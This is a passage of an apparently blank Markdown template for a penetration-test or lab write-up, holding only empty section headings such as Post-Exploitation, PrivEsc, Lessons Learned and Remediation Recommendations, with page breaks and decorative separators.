<div style="page-break-after: always;"></div>

## 4. Post-Exploitation
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 5. PrivEsc
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 6. Lessons Learned
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->

## 7. Remediation Recommendations
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## References

